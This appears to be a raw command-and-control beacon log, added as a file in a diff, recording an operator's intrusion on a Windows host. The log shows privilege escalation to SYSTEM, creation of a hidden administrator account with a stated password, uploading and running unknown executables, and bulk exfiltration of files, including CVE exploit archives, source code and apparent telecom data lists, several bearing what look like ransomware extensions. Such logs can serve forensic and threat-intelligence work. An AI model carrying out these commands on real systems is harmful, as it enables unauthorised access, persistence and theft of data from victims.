@@ -1,0 +1,224 @@
+12/11 09:50:22 UTC [metadata] 154.12.33.4 <- 10.0.6.5; computer: SER136523587756; user: Administrator *; process: WPEXPLOIT.exe; pid: 2952; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/11 09:50:55 UTC [input] <jhc> getsystem
+12/11 09:50:55 UTC [task] <T1134> Tasked beacon to get SYSTEM
+12/11 09:50:58 UTC [checkin] host called home, sent: 2743 bytes
+12/11 09:50:58 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+12/11 09:51:10 UTC [input] <jhc> shell net user jhc Mafia@123! /add
+12/11 09:51:10 UTC [task] <T1059> Tasked beacon to run: net user jhc Mafia@123! /add
+12/11 09:51:10 UTC [checkin] host called home, sent: 59 bytes
+12/11 09:51:11 UTC [output]
+received output:
+命令成功完成。
+
+
+
+12/11 09:52:46 UTC [input] <jhc> shell net localgroup administrators jhc /add
+12/11 09:52:46 UTC [task] <T1059> Tasked beacon to run: net localgroup administrators jhc /add
+12/11 09:52:48 UTC [checkin] host called home, sent: 69 bytes
+12/11 09:52:49 UTC [output]
+received output:
+命令成功完成。
+
+
+
+12/11 09:52:55 UTC [input] <jhc> shell curl ipinfo.io
+12/11 09:52:55 UTC [task] <T1059> Tasked beacon to run: curl ipinfo.io
+12/11 09:52:58 UTC [checkin] host called home, sent: 45 bytes
+12/11 09:52:58 UTC [output]
+received output:
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100   258  100   258    0     0    258      0  0:00:01 --:--:--  0:00:01  2744
+{
+  "ip": "154.12.33.4",
+  "city": "Los Angeles",
+  "region": "California",
+  "country": "US",
+  "loc": "34.0522,-118.2437",
+  "org": "AS35251 Zhihua Lu",
+  "postal": "90009",
+  "timezone": "America/Los_Angeles",
+  "readme": "https://ipinfo.io/missingauth"
+}
+
+12/11 09:58:12 UTC [checkin] host called home, sent: 19 bytes
+12/11 09:58:16 UTC [checkin] host called home, sent: 80 bytes
+12/11 10:05:52 UTC [checkin] host called home, sent: 19 bytes
+12/11 10:05:58 UTC [input] <jhc> upload /home/jhc/Downloads/fscan_linux_386 (C:\Users\Administrator\Desktop\fscan_linux_386)
+12/11 10:06:02 UTC [input] <jhc> upload /home/jhc/Downloads/ls.exe (C:\Users\Administrator\Desktop\ls.exe)
+12/11 10:06:02 UTC [task] <> Tasked beacon to upload /home/jhc/Downloads/ls.exe as C:\Users\Administrator\Desktop\ls.exe
+12/11 10:06:03 UTC [indicator] file: e08f2da6564ca009bf159e4a81e51458 55808 bytes C:\Users\Administrator\Desktop\ls.exe
+12/11 10:06:03 UTC [task] <> Tasked beacon to upload /home/jhc/Downloads/fscan_linux_386 as C:\Users\Administrator\Desktop\fscan_linux_386
+12/11 10:06:05 UTC [checkin] host called home, sent: 842395 bytes
+12/11 10:06:10 UTC [checkin] host called home, sent: 1040616 bytes
+12/11 10:06:12 UTC [indicator] file: c4ec6f7a86e6535a5687cb3a8d0f37b9 5468824 bytes C:\Users\Administrator\Desktop\fscan_linux_386
+12/11 10:06:13 UTC [input] <jhc> dir
+12/11 10:06:13 UTC [task] <T1059> Tasked beacon to run: dir
+12/11 10:06:14 UTC [checkin] host called home, sent: 1040616 bytes
+12/11 10:06:18 UTC [checkin] host called home, sent: 1040616 bytes
+12/11 10:06:22 UTC [checkin] host called home, sent: 1040616 bytes
+12/11 10:06:24 UTC [input] <jhc> shell start ls.exe
+12/11 10:06:24 UTC [task] <T1059> Tasked beacon to run: start ls.exe
+12/11 10:06:26 UTC [checkin] host called home, sent: 521203 bytes
+12/11 10:06:27 UTC [output]
+received output:
+ 驱动器 C 中的卷没有标签。
+ 卷的序列号是 4888-81B8
+
+ C:\Users\Administrator\Desktop 的目录
+
+2023/12/11  18:06    <DIR>          .
+2023/10/29  03:24    <DIR>          ..
+2023/10/29  00:14    <DIR>          datou
+2023/08/31  13:00             1,173 FinalShell.lnk
+2023/12/11  18:06         5,468,824 fscan_linux_386
+2023/12/07  16:45    <DIR>          Heart 个人
+2023/12/11  18:06            55,808 ls.exe
+2023/10/01  10:40         1,654,048 putty.exe
+2023/12/11  17:50         2,733,466 result (2).txt
+2023/11/20  22:38             1,056 Telegram.lnk
+2023/12/11  17:44             3,072 WPEXPLOIT.exe
+2023/10/27  18:51    <DIR>          新建文件夹
+               7 个文件      9,917,447 字节
+               5 个目录 23,130,288,128 可用字节
+
+
+12/11 10:06:33 UTC [input] <jhc> execute C:\Users\Administrator\Desktop\ls.exe
+12/11 10:06:33 UTC [task] <T1106> Tasked beacon to execute: C:\Users\Administrator\Desktop\ls.exe
+12/11 10:06:33 UTC [checkin] host called home, sent: 45 bytes
+12/11 10:06:40 UTC [input] <jhc> rm C:\Users\Administrator\Desktop\fscan_linux_386
+12/11 10:06:40 UTC [task] <T1107, > Tasked beacon to remove C:\Users\Administrator\Desktop\fscan_linux_386
+12/11 10:06:42 UTC [checkin] host called home, sent: 102 bytes
+12/11 10:07:40 UTC [input] <jhc> execute C:\Users\Administrator\Desktop\ls.exe
+12/11 10:07:40 UTC [task] <T1106> Tasked beacon to execute: C:\Users\Administrator\Desktop\ls.exe
+12/11 10:07:43 UTC [checkin] host called home, sent: 45 bytes
+12/11 10:07:57 UTC [input] <jhc> shell start ls.exe
+12/11 10:07:57 UTC [task] <T1059> Tasked beacon to run: start ls.exe
+12/11 10:07:58 UTC [checkin] host called home, sent: 43 bytes
+12/11 10:08:54 UTC [checkin] host called home, sent: 26 bytes
+12/11 10:09:01 UTC [checkin] host called home, sent: 30 bytes
+12/11 10:09:07 UTC [input] <jhc> upload /home/jhc/Downloads/ls.exe (C:\Users\jhc\Desktop\ls.exe)
+12/11 10:09:07 UTC [task] <> Tasked beacon to upload /home/jhc/Downloads/ls.exe as C:\Users\jhc\Desktop\ls.exe
+12/11 10:09:07 UTC [indicator] file: e08f2da6564ca009bf159e4a81e51458 55808 bytes C:\Users\jhc\Desktop\ls.exe
+12/11 10:09:07 UTC [checkin] host called home, sent: 55923 bytes
+12/11 10:09:53 UTC [checkin] host called home, sent: 19 bytes
+12/11 10:10:01 UTC [input] <jhc> rm C:\Users\Administrator\Desktop\ls.exe
+12/11 10:10:01 UTC [task] <T1107, > Tasked beacon to remove C:\Users\Administrator\Desktop\ls.exe
+12/11 10:10:02 UTC [checkin] host called home, sent: 93 bytes
+12/11 10:18:37 UTC [checkin] host called home, sent: 30 bytes
+12/11 10:18:46 UTC [checkin] host called home, sent: 38 bytes
+12/11 10:18:50 UTC [input] <jhc> upload /home/jhc/Downloads/LB3.exe (C:\Users\jhc\Desktop\LB3.exe)
+12/11 10:18:50 UTC [task] <> Tasked beacon to upload /home/jhc/Downloads/LB3.exe as C:\Users\jhc\Desktop\LB3.exe
+12/11 10:18:50 UTC [indicator] file: b9ce9c15793ec92ae6cdbdb3d73f9047 157184 bytes C:\Users\jhc\Desktop\LB3.exe
+12/11 10:18:52 UTC [checkin] host called home, sent: 157262 bytes
+12/11 10:20:17 UTC [checkin] host called home, sent: 80 bytes
+12/11 10:20:30 UTC [checkin] host called home, sent: 52 bytes
+12/11 10:24:23 UTC [checkin] host called home, sent: 50 bytes
+12/11 10:24:37 UTC [input] <jhc> download C:\Users\Administrator\Downloads\CVE-2023-36845-main.zip.7ZJxhtYlv
+12/11 10:24:37 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\CVE-2023-36845-main.zip.7ZJxhtYlv
+12/11 10:24:38 UTC [checkin] host called home, sent: 74 bytes
+12/11 10:24:39 UTC [output]
+started download of C:\Users\Administrator\Downloads\CVE-2023-36845-main.zip.7ZJxhtYlv (272240 bytes)
+
+12/11 10:24:39 UTC [output]
+download of CVE-2023-36845-main.zip.7ZJxhtYlv is complete
+
+12/11 10:25:29 UTC [input] <jhc> download C:\Users\Administrator\Downloads\CVE-2021-22986-main.zip.7ZJxhtYlv
+12/11 10:25:29 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\CVE-2021-22986-main.zip.7ZJxhtYlv
+12/11 10:25:31 UTC [checkin] host called home, sent: 74 bytes
+12/11 10:25:32 UTC [output]
+started download of C:\Users\Administrator\Downloads\CVE-2021-22986-main.zip.7ZJxhtYlv (3677115 bytes)
+
+12/11 10:25:49 UTC [checkin] host called home, sent: 67 bytes
+12/11 10:26:02 UTC [output]
+download of CVE-2021-22986-main.zip.7ZJxhtYlv is complete
+
+12/11 10:26:13 UTC [input] <jhc> download C:\Users\Administrator\Downloads\Telegram Desktop\10991新端源码.zip.7ZJxhtYlv
+12/11 10:26:13 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\Telegram Desktop\10991新端源码.zip.7ZJxhtYlv
+12/11 10:26:14 UTC [checkin] host called home, sent: 85 bytes
+12/11 10:26:16 UTC [output]
+started download of C:\Users\Administrator\Downloads\Telegram Desktop\10991新端源码.zip.7ZJxhtYlv (1081834 bytes)
+
+12/11 10:26:16 UTC [input] <jhc> download C:\Users\Administrator\Downloads\Telegram Desktop\25000去后门集群.zip.7ZJxhtYlv
+12/11 10:26:16 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\Telegram Desktop\25000去后门集群.zip.7ZJxhtYlv
+12/11 10:26:19 UTC [checkin] host called home, sent: 87 bytes
+12/11 10:26:21 UTC [output]
+started download of C:\Users\Administrator\Downloads\Telegram Desktop\25000去后门集群.zip.7ZJxhtYlv (3144491 bytes)
+
+12/11 10:26:25 UTC [output]
+download of 10991新端源码.zip.7ZJxhtYlv is complete
+
+12/11 10:26:41 UTC [input] <jhc> download C:\Users\Administrator\Downloads\Telegram Desktop\TF内部版3.8.zip.7ZJxhtYlv
+12/11 10:26:41 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\Telegram Desktop\TF内部版3.8.zip.7ZJxhtYlv
+12/11 10:26:42 UTC [checkin] host called home, sent: 83 bytes
+12/11 10:26:43 UTC [output]
+started download of C:\Users\Administrator\Downloads\Telegram Desktop\TF内部版3.8.zip.7ZJxhtYlv (6301265 bytes)
+
+12/11 10:26:43 UTC [output]
+download of 25000去后门集群.zip.7ZJxhtYlv is complete
+
+12/11 10:27:03 UTC [input] <jhc> download C:\Users\Administrator\Downloads\Telegram Desktop\电信 (2).txt.7ZJxhtYlv
+12/11 10:27:03 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\Telegram Desktop\电信 (2).txt.7ZJxhtYlv
+12/11 10:27:05 UTC [input] <jhc> download C:\Users\Administrator\Downloads\Telegram Desktop\电信.txt.7ZJxhtYlv
+12/11 10:27:05 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\Telegram Desktop\电信.txt.7ZJxhtYlv
+12/11 10:27:06 UTC [input] <jhc> download C:\Users\Administrator\Downloads\Telegram Desktop\移动 (2).txt.7ZJxhtYlv
+12/11 10:27:06 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\Telegram Desktop\移动 (2).txt.7ZJxhtYlv
+12/11 10:27:07 UTC [input] <jhc> download C:\Users\Administrator\Downloads\Telegram Desktop\移动.txt.7ZJxhtYlv
+12/11 10:27:07 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\Telegram Desktop\移动.txt.7ZJxhtYlv
+12/11 10:27:08 UTC [checkin] host called home, sent: 312 bytes
+12/11 10:27:09 UTC [input] <jhc> download C:\Users\Administrator\Downloads\Telegram Desktop\联通 (2).txt.7ZJxhtYlv
+12/11 10:27:09 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\Telegram Desktop\联通 (2).txt.7ZJxhtYlv
+12/11 10:27:09 UTC [output]
+started download of C:\Users\Administrator\Downloads\Telegram Desktop\电信 (2).txt.7ZJxhtYlv (28353 bytes)
+
+12/11 10:27:09 UTC [output]
+started download of C:\Users\Administrator\Downloads\Telegram Desktop\电信.txt.7ZJxhtYlv (28345 bytes)
+
+12/11 10:27:09 UTC [output]
+started download of C:\Users\Administrator\Downloads\Telegram Desktop\移动 (2).txt.7ZJxhtYlv (577 bytes)
+
+12/11 10:27:09 UTC [output]
+started download of C:\Users\Administrator\Downloads\Telegram Desktop\移动.txt.7ZJxhtYlv (569 bytes)
+
+12/11 10:27:09 UTC [output]
+download of 移动.txt.7ZJxhtYlv is complete
+
+12/11 10:27:09 UTC [output]
+download of 移动 (2).txt.7ZJxhtYlv is complete
+
+12/11 10:27:09 UTC [output]
+download of 电信.txt.7ZJxhtYlv is complete
+
+12/11 10:27:09 UTC [output]
+download of 电信 (2).txt.7ZJxhtYlv is complete
+
+12/11 10:27:10 UTC [input] <jhc> download C:\Users\Administrator\Downloads\Telegram Desktop\联通.txt.7ZJxhtYlv
+12/11 10:27:10 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\Telegram Desktop\联通.txt.7ZJxhtYlv
+12/11 10:27:12 UTC [checkin] host called home, sent: 156 bytes
+12/11 10:27:14 UTC [output]
+started download of C:\Users\Administrator\Downloads\Telegram Desktop\联通 (2).txt.7ZJxhtYlv (4826 bytes)
+
+12/11 10:27:14 UTC [output]
+started download of C:\Users\Administrator\Downloads\Telegram Desktop\联通.txt.7ZJxhtYlv (4818 bytes)
+
+12/11 10:27:14 UTC [output]
+download of 联通.txt.7ZJxhtYlv is complete
+
+12/11 10:27:14 UTC [output]
+download of 联通 (2).txt.7ZJxhtYlv is complete
+
+12/11 10:28:13 UTC [input] <jhc> upload /home/jhc/Desktop/fuck.exe (C:\Users\Administrator\Downloads\Telegram Desktop\fuck.exe)
+12/11 10:28:14 UTC [task] <> Tasked beacon to upload /home/jhc/Desktop/fuck.exe as C:\Users\Administrator\Downloads\Telegram Desktop\fuck.exe
+12/11 10:28:14 UTC [indicator] file: a323c6dbcbab9cb2854b06a318589619 458752 bytes C:\Users\Administrator\Downloads\Telegram Desktop\fuck.exe
+12/11 10:28:40 UTC [input] <jhc> upload /home/jhc/Desktop/fuck.exe (C:\Users\Administrator\Downloads\fuck.exe)
+12/11 10:28:41 UTC [task] <> Tasked beacon to upload /home/jhc/Desktop/fuck.exe as C:\Users\Administrator\Downloads\fuck.exe
+12/11 10:28:41 UTC [indicator] file: a323c6dbcbab9cb2854b06a318589619 458752 bytes C:\Users\Administrator\Downloads\fuck.exe
+12/11 10:51:31 UTC [input] <jhc> download C:\Users\Administrator\Downloads\CVE-2021-22986-main.zip.7ZJxhtYlv
+12/11 10:51:31 UTC [task] <T1005> Tasked beacon to download C:\Users\Administrator\Downloads\CVE-2021-22986-main.zip.7ZJxhtYlv
+12/11 10:52:26 UTC [input] <jhc> upload /home/jhc/Desktop/fuck.exe (C:\Users\Administrator\Downloads\fuck.exe)
+12/11 10:52:26 UTC [task] <> Tasked beacon to upload /home/jhc/Desktop/fuck.exe as C:\Users\Administrator\Downloads\fuck.exe
+12/11 10:52:27 UTC [indicator] file: a323c6dbcbab9cb2854b06a318589619 458752 bytes C:\Users\Administrator\Downloads\fuck.exe
